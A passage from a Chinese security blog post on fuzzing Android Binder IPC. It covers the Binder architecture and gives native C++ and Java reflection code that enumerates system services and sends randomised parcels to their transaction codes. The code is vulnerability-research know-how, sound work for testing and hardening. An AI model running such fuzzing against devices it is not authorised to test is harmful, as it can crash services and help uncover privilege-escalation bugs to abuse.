<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Android Binder Fuzzing 的一些思路 | 安全代码</title><meta name="author" content="henices"><meta name="copyright" content="henices"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1. binder 简介Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalv">
<meta property="og:type" content="article">
<meta property="og:title" content="Android Binder Fuzzing 的一些思路">
<meta property="og:url" content="https://usmacd.com/cn/Android_binder_fuzzing/index.html">
<meta property="og:site_name" content="安全代码">
<meta property="og:description" content="1. binder 简介Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalv">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640">
<meta property="article:published_time" content="2023-09-06T03:00:51.188Z">
<meta property="article:modified_time" content="2023-09-06T03:00:51.188Z">
<meta property="article:author" content="henices">
<meta property="article:tag" content="Android">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Android Binder Fuzzing 的一些思路",
  "url": "https://usmacd.com/cn/Android_binder_fuzzing/",
  "image": "https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640",
  "datePublished": "2023-09-06T03:00:51.188Z",
  "dateModified": "2023-09-06T03:00:51.188Z",
  "author": [
    {
      "@type": "Person",
      "name": "henices",
      "url": "https://usmacd.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://usmacd.com/cn/Android_binder_fuzzing/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Android Binder Fuzzing 的一些思路',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">166</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">安全代码</span></a><a class="nav-page-title" href="/"><span class="site-name">Android Binder Fuzzing 的一些思路</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Android Binder Fuzzing 的一些思路</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-06T03:00:51.188Z" title="发表于 2023-09-06 11:00:51">2023-09-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-06T03:00:51.188Z" title="更新于 2023-09-06 11:00:51">2023-09-06</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="1-binder-简介"><a href="#1-binder-简介" class="headerlink" title="1. binder 简介"></a>1. binder 简介</h2><p>Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。<br>在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用<br>Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalvik 虚拟机使用应用程序的用户 ID 运行在自己的进程中。<br>这些关键的机制在操作系统层面上强制数据安全，因为应用程序之间不共享内存、访问权限及磁盘存储。应用程序只能在它们自己的 Dalvik 虚拟机范围内访问内存和数据。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ps</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">u0_a16        2757   882 2574956 116944 SyS_epoll+          0 S com.google.android.gms.persistent</span><br><span class="line">u0_a128       2774   883 1939084  87720 SyS_epoll+          0 S com.ss.android.article.news:push</span><br><span class="line">u0_a16        2850   882 2322980  46592 SyS_epoll+          0 S com.google.process.gapps</span><br><span class="line">u0_a128       2887   883 2190568 181868 SyS_epoll+          0 S com.ss.android.article.news</span><br><span class="line">u0_a37        2900   882 2430908  58316 SyS_epoll+          0 S com.google.android.googlequicksearchbox:interactor</span><br><span class="line">nfc           2918   882 2351828  62356 SyS_epoll+          0 S com.android.nfc</span><br><span class="line">u0_a45        2930   882 2309884  43576 SyS_epoll+          0 S se.dirac.acs</span><br><span class="line">radio         2945   882 2313144  45592 SyS_epoll+          0 S net.oneplus.push</span><br><span class="line">u0_a0         2956   882 2304600  36360 SyS_epoll+          0 S com.oneplus</span><br><span class="line">system        2967   882 2307276  38088 SyS_epoll+          0 S com.fingerprints.serviceext</span><br><span class="line">system        2985   882 2309992  42044 SyS_epoll+          0 S com.oneplus.opbugreportlite</span><br><span class="line">u0_a142       2997   882 2370296  93324 SyS_epoll+          0 S com.oneplus.aod</span><br><span class="line">u0_a16        3018   882 2731976 165828 SyS_epoll+          0 S com.google.android.gms</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Android app 是由 Activity、Service、Broadcast 和 Content Provider 四大组件构成，而这些组件可能运行在同一进程中，也可能运行在不同的<br>进程中，而像 PowerManagerService等重要服务都运行在核心进程 <code>system_server</code> 里，所以 Android 系统必须实现一个靠谱的进程间通信机制 （IPC）。<br>Android系统基于 Linux 开发，Linux 中有很多进程间通信的方法，如 Signal、Pipe、Socket、Share Memeory、Semaphore， 但是 Android 系统并没有使用<br>这些进程间通信的方法，而是基于 OpenBinder 自己开发了一套进程通信的方法，Binder 是 Android 系统 IPC 通信的机制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell ps | grep system_server</span><br><span class="line">system 63 32 120160 35408 ffffffff afd0c738 S system_server</span><br><span class="line"></span><br><span class="line">$ adb logcat | grep &quot;63)&quot;</span><br><span class="line">...</span><br><span class="line">D/PowerManagerService( 63): bootCompleted</span><br><span class="line">I/TelephonyRegistry( 63): notifyServiceState: 0 home Android Android 310260 UMTS CSS not supp...</span><br><span class="line">I/TelephonyRegistry( 63): notifyDataConnection: state=0 isDataConnectivityPossible=false reason=null</span><br><span class="line">interfaceName=null networkType=3</span><br><span class="line">I/SearchManagerService( 63): Building list of searchable activities</span><br><span class="line">I/WifiService( 63): WifiService trying to setNumAllowed to 11 with persist set to true</span><br><span class="line">I/ActivityManager( 63): Config changed: &#123; scale=1.0 imsi=310/260 loc=en_US touch=3 keys=2/1/2 nav=3/1 ...</span><br><span class="line">I/TelephonyRegistry( 63): notifyMessageWaitingChanged: false</span><br><span class="line">I/TelephonyRegistry( 63): notifyCallForwardingChanged: false</span><br><span class="line">I/TelephonyRegistry( 63): notifyDataConnection: state=1 isDataConnectivityPossible=true reason=simL...</span><br><span class="line">I/TelephonyRegistry( 63): notifyDataConnection: state=2 isDataConnectivityPossible=true reason=simL...</span><br><span class="line">D/Tethering( 63): MasterInitialState.processMessage what=3</span><br><span class="line">I/ActivityManager( 63): Start proc android.process.media for broadcast</span><br><span class="line">com.android.providers.downloads/.DownloadReceiver: pid=223 uid=10002 gids=&#123;1015, 2001, 3003&#125;</span><br><span class="line">I/RecoverySystem( 63): No recovery log file</span><br><span class="line">W/WindowManager( 63): App freeze timeout expired.</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226160614691_1337421380.png" alt="binder"></p>
<h2 id="2-Binder-架构"><a href="#2-Binder-架构" class="headerlink" title="2. Binder 架构"></a>2. Binder 架构</h2><p>Binder 使用 CS （Client&#x2F;Server） 模型，提供服务的进程是 Server 进程，访问服务的是 Client 进程。从代码实现的角度看，Binder架构采用的是分层架构设计,<br>大致上可以分为 Java 层， Java IPC 层，Native IPC 层， Linux 内核层。</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224151909041_1890401128.png" alt="1"></p>
<p>从组件的视角来看，Binder 包含了 Client、Server、ServiceManger 和 binder 驱动， ServiceManager 用于管理系统中的各种服务，见下图。</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224155625665_1820827979.gif" alt="2"></p>
<p>图中虚线的箭头为跨进程的进程间通信，必须使用 Android IPC binder 机制。</p>
<h2 id="3-为什么要-fuzz-binder"><a href="#3-为什么要-fuzz-binder" class="headerlink" title="3. 为什么要 fuzz binder"></a>3. 为什么要 fuzz binder</h2><p>把 Binder 作为一个目标的原因比较明显的，因为在 Android 的安全模型中，Binder 是一个重要的安全边界。在一个低权限<br>的 app 里面构造的数据，会在高权限的进程里面使用，如果发生问题，就是一个明显的权限提升漏洞。另外数据在处理的过程中，<br>有 flatten 和 unflatten 两个步骤，这些步骤就像我们平时说的编码和解码一样非常容易出问题。</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225102933309_922476451.png" alt="weakness"></p>
<p>存在一些非常经典的漏洞， 例如 CVE-2014-7911 该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。</p>
<h2 id="4-实现"><a href="#4-实现" class="headerlink" title="4. 实现"></a>4. 实现</h2><p>在每个层面都可以实现相关代码进行 Fuzz， 下面分析在每个层面的具体实现。</p>
<h3 id="4-1-直接调用-ioctl"><a href="#4-1-直接调用-ioctl" class="headerlink" title="4.1  直接调用 ioctl"></a>4.1  直接调用 ioctl</h3><p>实现 Binder fuzzer 的方法有好几种，最直接的想法当然就是直接调用 ioctl 系统调用。</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225101500954_2019536930.png" alt="ioctl"></p>
<p>其中 fd 可以通过打开 &#x2F;dev&#x2F;binder 设备文件获得，难点在 <code>binder_write_read</code> 数据结构的构造。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDWR);</span><br></pre></td></tr></table></figure>

<h3 id="4-2-Native-层"><a href="#4-2-Native-层" class="headerlink" title="4.2 Native 层"></a>4.2 Native 层</h3><p>在 Native 层，利用 IBinder 可以将问题简化， 看上面的结构图，通过阅读 Android 源码， 可以看出我们可以利用 IBinder<br>的 transcat 来调用相应的Binder 接口函数，参考：</p>
<p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp">https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp</a></p>
<p>调用 IBinder 的 transact 需要自己填充 parcel 数据， 可以从下面的示意理解大致的含义：</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226153937869_763457039.png" alt="5"></p>
<p>code 为 Binder 调用接口的功能号， parcel 中需要指定调用那个接口。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String16 <span class="title">get_interface_name</span><span class="params">(sp&lt;IBinder&gt; service)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (service != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        Parcel data, reply;</span><br><span class="line">        <span class="type">status_t</span> err = service-&gt;<span class="built_in">transact</span>(IBinder::INTERFACE_TRANSACTION, data, &amp;reply);</span><br><span class="line">        <span class="keyword">if</span> (err == NO_ERROR) &#123;</span><br><span class="line">            <span class="keyword">return</span> reply.<span class="built_in">readString16</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String16</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>.</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sp&lt;IServiceManager&gt; sm = <span class="built_in">defaultServiceManager</span>();</span><br><span class="line">    Vector&lt;String16&gt; services = sm-&gt;<span class="built_in">listServices</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; services.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        String16 name = services[i];</span><br><span class="line">        sp&lt;IBinder&gt; service = sm-&gt;<span class="built_in">checkService</span>(name);</span><br><span class="line">        String16 ifName = <span class="built_in">get_interface_name</span>(service);</span><br><span class="line">        <span class="keyword">if</span> (service != <span class="literal">NULL</span> &amp;&amp; ifName.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">uint32_t</span> code = <span class="number">0</span>; code &lt;= <span class="number">100</span>; code++) &#123;</span><br><span class="line">                aout &lt;&lt; <span class="string">&quot;ifName: &quot;</span> &lt;&lt; ifName &lt;&lt; <span class="string">&quot;, code: &quot;</span> &lt;&lt; code &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">                Parcel data, reply;</span><br><span class="line">                data.<span class="built_in">writeInterfaceToken</span>(ifName);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">random</span>() % <span class="number">800</span>; i++ ) &#123;</span><br><span class="line">                    <span class="type">uint32_t</span> a = <span class="built_in">random</span>();</span><br><span class="line">                    aout &lt;&lt; <span class="string">&quot;data[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">                    data.<span class="built_in">writeInt32</span>(a);</span><br><span class="line">                &#125;</span><br><span class="line">                service-&gt;<span class="built_in">transact</span>(code, data, &amp;reply, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-Java-应用层"><a href="#4-3-Java-应用层" class="headerlink" title="4.3 Java 应用层"></a>4.3 Java 应用层</h3><p>到了 Java 应用层，我们可以获得的信息就丰富了，可以获得详细的信息。</p>
<h4 id="1-获取所有运行的services"><a href="#1-获取所有运行的services" class="headerlink" title="1) 获取所有运行的services"></a>1) 获取所有运行的services</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] getServices() &#123;</span><br><span class="line">    String[] services = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        services = (String[]) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;listServices&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> services;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-获得对应服务的IBinder-对象"><a href="#2-获得对应服务的IBinder-对象" class="headerlink" title="2) 获得对应服务的IBinder 对象"></a>2) 获得对应服务的IBinder 对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-利用反射获取对应接口的所有code"><a href="#3-利用反射获取对应接口的所有code" class="headerlink" title="3) 利用反射获取对应接口的所有code"></a>3) 利用反射获取对应接口的所有code</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HashMap&lt;String,Integer&gt; <span class="title function_">getBinderCode</span><span class="params">(String interfaceDescriptor)</span> &#123;</span><br><span class="line">    HashMap&lt;String, Integer&gt; codes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (interfaceDescriptor == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> codes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; cStub = Class</span><br><span class="line">                .forName(interfaceDescriptor + <span class="string">&quot;$Stub&quot;</span>);</span><br><span class="line">        Field[] f = cStub.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : f) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            String k= field.toString().split(<span class="string">&quot;\\$Stub\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (k.contains(<span class="string">&quot;TRANSACTION&quot;</span>))</span><br><span class="line">                codes.put(k, (<span class="type">int</span>)field.get(<span class="built_in">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> codes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-利用反射获取对应接口所有调用的参数类型"><a href="#4-利用反射获取对应接口所有调用的参数类型" class="headerlink" title="4) 利用反射获取对应接口所有调用的参数类型"></a>4) 利用反射获取对应接口所有调用的参数类型</h4><p>binder call 的参数类型</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HashMap&lt;String, List&lt;String&gt;&gt;</span><br><span class="line">    <span class="title function_">getBinderCallParameter</span><span class="params">(String interfaceDescriptor,</span></span><br><span class="line"><span class="params">                           